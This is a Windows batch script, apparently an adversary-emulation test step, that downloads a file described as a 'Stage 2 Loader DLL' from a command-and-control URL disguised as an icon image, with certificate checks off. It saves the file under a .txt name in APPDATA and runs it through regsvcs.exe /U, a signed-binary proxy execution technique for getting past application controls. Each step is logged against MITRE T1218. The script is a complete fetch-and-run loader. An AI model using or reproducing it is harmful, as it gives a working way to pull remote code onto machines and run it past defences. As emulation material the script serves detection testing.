@echo off
setlocal enabledelayedexpansion

REM Cache initial timestamp for debug logging
set tsvar=!DATE!/!TIME!

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET aBcDeFgH=%APPDATA%\11571\5cc41d90
SET xYzAbCdE=6dc0502f.txt
SET qWeRtY12=https://10.0.0.49/stage/2/icon.png?11571-7
SET mNoPqRsT=ITZEL-S2B
SET uVwXyZ34=11571
SET lMnOpQrS=7
SET jKlMnOpQ=%PUBLIC%\\macula-simulations.log
REM https://10.0.0.49 not directly used in script but defined for compliance
SET zXcVbNmL=https://10.0.0.49

REM Debug log: heartbeat start
echo [!tsvar!][DEBUG][!mNoPqRsT!][!uVwXyZ34!]: heartbeat_start>> "!jKlMnOpQ!" 2>nul

REM Step 1: Heartbeat fetch — download Stage 2 Loader DLL from C2
curl -k -s -o "!aBcDeFgH!\!xYzAbCdE!" "!qWeRtY12!" 2>> "!jKlMnOpQ!"
set CURL_EXIT=%ERRORLEVEL%

REM Debug log: heartbeat complete
echo [!tsvar!][DEBUG][!mNoPqRsT!][!uVwXyZ34!]: heartbeat_complete>> "!jKlMnOpQ!" 2>nul

REM Check if download succeeded (file exists and non-zero)
if %CURL_EXIT% neq 0 (
    set RESULT=FAIL
    set ERROR_DETAIL=curl_exit_%CURL_EXIT%
    goto log_and_exit_fail
)
if not exist "!aBcDeFgH!\!xYzAbCdE!" (
    set RESULT=FAIL
    set ERROR_DETAIL=file_not_found
    goto log_and_exit_fail
)
for %%F in ("!aBcDeFgH!\!xYzAbCdE!") do if %%~zF equ 0 (
    set RESULT=FAIL
    set ERROR_DETAIL=file_empty
    goto log_and_exit_fail
)

REM Step 2: Position working directory
echo [!tsvar!][DEBUG][!mNoPqRsT!][!uVwXyZ34!]: chdir_start>> "!jKlMnOpQ!" 2>nul
cd /d "!aBcDeFgH!" >nul 2>&1
set CD_EXIT=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!mNoPqRsT!][!uVwXyZ34!]: chdir_result=!CD_EXIT!>> "!jKlMnOpQ!" 2>nul
if !CD_EXIT! neq 0 (
    set RESULT=FAIL
    set ERROR_DETAIL=chdir_fail
    goto log_and_exit_fail
)

REM Step 3: Invoke Stage 2 DLL via regsvcs.exe /U
echo [!tsvar!][DEBUG][!mNoPqRsT!][!uVwXyZ34!]: regsvcs_start>> "!jKlMnOpQ!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!xYzAbCdE!" >NUL 2>&1
set REGSVCS_EXIT=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!mNoPqRsT!][!uVwXyZ34!]: regsvcs_result=!REGSVCS_EXIT!>> "!jKlMnOpQ!" 2>nul

REM Check regsvcs exit code
if !REGSVCS_EXIT! neq 0 (
    set RESULT=FAIL
    set ERROR_DETAIL=regsvcs_exit_!REGSVCS_EXIT!
    goto log_and_exit_fail
) else (
    set RESULT=OK
    set ERROR_DETAIL=
    goto log_and_exit_ok
)

:log_and_exit_fail
REM Generate timestamp for TTP log
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t
echo [!timestamp!][TTP][!mNoPqRsT!][!uVwXyZ34!]: T1218^|System Binary Proxy Execution=[%RESULT%]:[%ERROR_DETAIL%]>> "!jKlMnOpQ!" 2>&1
if %ERRORLEVEL% neq 0 (
    REM Log write failure - silent
)
endlocal
exit /b 1

:log_and_exit_ok
REM Generate timestamp for TTP log
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t
echo [!timestamp!][TTP][!mNoPqRsT!][!uVwXyZ34!]: T1218^|System Binary Proxy Execution=[%RESULT%]:[]>> "!jKlMnOpQ!" 2>&1
if %ERRORLEVEL% neq 0 (
    REM Log write failure - silent
)
endlocal
exit /b 0